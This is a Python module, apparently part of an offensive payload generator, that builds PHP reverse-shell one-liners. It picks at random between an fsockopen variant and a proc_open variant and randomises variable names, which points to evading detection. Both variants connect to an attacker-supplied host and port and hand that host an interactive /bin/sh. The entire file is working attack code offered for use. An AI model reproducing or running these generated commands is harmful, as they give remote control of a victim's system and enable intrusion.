import random
from .base import RandomNamePool, ShellGenerator, ShellResult

_VARIANTS = ["fsockopen", "proc_open"]


class PHPGenerator(ShellGenerator):
    language = "php"

    def _generate(self, lhost: str, lport: int, arch: str, names: RandomNamePool | None) -> ShellResult:
        variant = random.choice(_VARIANTS)

        if variant == "fsockopen":
            cmd = self._fsockopen(lhost, lport, names)
        else:
            cmd = self._proc_open(lhost, lport, names)

        return ShellResult(command=cmd, variant=variant, language=self.language, arch=arch)

    def _fsockopen(self, lhost: str, lport: int, names: RandomNamePool | None) -> str:
        sock = self._var("sock", names)
        return (
            f'php -r \'${sock}=fsockopen("{lhost}",{lport});'
            f'exec("/bin/sh -i <&3 >&3 2>&3");\''
        )

    def _proc_open(self, lhost: str, lport: int, names: RandomNamePool | None) -> str:
        sock = self._var("sock", names)
        proc = self._var("proc", names)
        pipes = self._var("pipes", names)
        return (
            f'php -r \'${sock}=fsockopen("{lhost}",{lport});'
            f'${proc}=proc_open("/bin/sh",array(0=>${sock},1=>${sock},2=>${sock}),${pipes});\''
        )
